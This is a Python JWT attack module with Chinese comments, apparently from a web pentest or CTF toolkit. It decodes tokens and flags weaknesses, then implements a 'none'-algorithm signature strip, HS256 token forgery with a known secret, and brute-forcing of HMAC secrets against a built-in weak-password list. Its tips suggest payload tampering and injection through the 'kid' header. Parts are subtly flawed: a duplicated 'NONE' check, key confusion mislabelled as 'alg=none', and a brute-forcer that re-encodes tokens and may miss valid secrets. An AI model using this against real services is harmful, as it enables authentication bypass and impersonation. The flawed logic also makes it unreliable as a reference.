# -*- coding: utf-8 -*-
"""JWT 工具 — 解析、分析、攻击 JSON Web Token.

支持:
    - 解码 header/payload (不验证签名)
    - 算法检测 & 风险分析
    - None 算法攻击
    - 弱密钥提示
    - 时间有效性检查
"""
import json
import base64
import time
import hmac
import hashlib
from typing import Optional, Tuple, Dict, Any, List


def _b64url_decode(data: str) -> bytes:
    """URL-safe base64 解码 (JWT 专用, 无 padding)."""
    data = data.strip()
    # JWT 使用 base64url 无 padding
    missing = len(data) % 4
    if missing:
        data += "=" * (4 - missing)
    data = data.replace("-", "+").replace("_", "/")
    return base64.b64decode(data)


def _b64url_encode(data: bytes) -> str:
    """URL-safe base64 编码."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def decode_jwt(token: str) -> Tuple[Optional[Dict], Optional[Dict], Optional[str]]:
    """解码 JWT (不验证签名).

    返回: (header, payload, signature_raw) 或 (None, None, 错误信息).
    """
    token = token.strip()
    parts = token.split(".")

    if len(parts) != 3:
        return None, None, "Invalid JWT: expected 3 parts (header.payload.signature)"

    try:
        header_bytes = _b64url_decode(parts[0])
        payload_bytes = _b64url_decode(parts[1])
        header = json.loads(header_bytes)
        payload = json.loads(payload_bytes)
    except Exception as e:
        return None, None, f"Decode error: {e}"

    return header, payload, parts[2]


def analyze_jwt(token: str) -> dict:
    """全面分析 JWT Token.

    返回分析结果字典.
    """
    header, payload, sig = decode_jwt(token)
    if header is None:
        return {"error": sig}

    analysis = {
        "header": header,
        "payload": payload,
        "signature": sig[:20] + "..." if len(sig) > 20 else sig,
        "algorithm": header.get("alg", "unknown"),
        "warnings": [],
        "tips": [],
    }

    alg = header.get("alg", "").upper()

    # ── 算法风险分析 ──
    if alg == "NONE" or alg == "NONE":
        analysis["warnings"].append("⚠ None 算法 — 签名可被绕过!")
        analysis["tips"].append("尝试删除签名部分, 设置 alg=none")

    if alg == "HS256" or alg == "HS384" or alg == "HS512":
        analysis["warnings"].append("⚠ HMAC 签名 — 若密钥泄露可被伪造")
        analysis["tips"].append("尝试弱密钥爆破: yang_web jwt -t <token> -w <wordlist>")

    if alg.startswith("RS") or alg.startswith("ES"):
        analysis["warnings"].append("⚠ 非对称加密 — 检查是否存在密钥混淆漏洞 (alg=none)")

    if alg.startswith("HS") and "jku" in header:
        analysis["warnings"].append("⚠ 发现 jku 头 — 可能存在 JKU 注入风险")
        analysis["tips"].append("检查 jku 地址是否可控")

    if "kid" in header:
        kid = header["kid"]
        analysis["tips"].append(f"kid = '{kid}' — 尝试路径遍历或 SQL 注入")

    # ── 时间检查 ──
    now = int(time.time())
    if "exp" in payload:
        exp = payload["exp"]
        if exp < now:
            analysis["warnings"].append(f"⚠ Token 已过期 (exp: {exp}, now: {now})")
            analysis["tips"].append(f"Token 于 {time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(exp))} 过期")
        else:
            remaining = exp - now
            analysis["info"] = f"Token 有效期剩余: {remaining // 3600}h {(remaining % 3600) // 60}m"

    if "iat" in payload:
        iat = payload["iat"]
        analysis["info"] = analysis.get("info", "") + f" | 签发时间: {time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(iat))}"

    if "nbf" in payload:
        nbf = payload["nbf"]
        if nbf > now:
            analysis["warnings"].append(f"⚠ Token 尚未生效 (nbf: {nbf}, now: {now})")

    # ── payload 分析 ──
    sensitive_fields = ["password", "passwd", "secret", "key", "token", "admin", "role", "is_admin"]
    for field in sensitive_fields:
        if field in payload:
            analysis["tips"].append(f"发现敏感字段 '{field}' = '{payload[field]}' — 尝试篡改")

    return analysis


def none_attack(token: str) -> Tuple[str, dict]:
    """None 算法攻击 — 移除签名并将算法设为 none.

    返回: (新token, 解码后的payload).
    """
    header, payload, _ = decode_jwt(token)
    if header is None:
        return "", {"error": payload}

    header["alg"] = "none"
    new_header = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    new_payload = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    new_token = f"{new_header}.{new_payload}."

    return new_token, payload


def forge_hs256(token: str, secret: str, new_payload: Optional[dict] = None) -> str:
    """使用已知密钥伪造 HS256 JWT.

    Args:
        token: 原始 token (用于提取 header)
        secret: HMAC 密钥
        new_payload: 新的 payload (None 则使用原 payload)
    """
    header, payload, _ = decode_jwt(token)
    if header is None:
        return ""

    header["alg"] = "HS256"
    target_payload = new_payload if new_payload else payload

    header_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = _b64url_encode(json.dumps(target_payload, separators=(",", ":")).encode())

    signing_input = f"{header_b64}.{payload_b64}"
    signature = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
    sig_b64 = _b64url_encode(signature)

    return f"{signing_input}.{sig_b64}"


def brute_jwt(token: str, wordlist: list) -> List[Tuple[str, str]]:
    """爆破 HS256 JWT 密钥 (使用常见弱密码).

    返回: [(密钥, 完整Token), ...] 匹配的结果.
    """
    header, payload, sig_orig = decode_jwt(token)
    if header is None:
        return []

    header["alg"] = "HS256"
    header_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}"

    results = []
    for secret in wordlist:
        secret = secret.strip()
        if not secret:
            continue
        sig = _b64url_encode(hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest())
        if sig == sig_orig:
            results.append((secret, f"{signing_input}.{sig}"))
    return results


# 内建弱密码列表
BUILTIN_WORDLIST = [
    "secret", "password", "123456", "admin", "key", "jwt_secret",
    "secret_key", "mysecret", "changeme", "super_secret", "iloveyou",
    "letmein", "monkey", "dragon", "master", "qwerty", "football",
    "baseball", "trustno1", "sunshine", "princess", "welcome",
    "secret123", "password123", "admin123", "ctf", "flag",
    "key123", "jwt_key", "jwt", "token", "secure", "security",
    "private_key", "public_key", "api_key", "api_secret",
    "5ecret", "P@ssw0rd", "s3cr3t", "p@ssword",
]
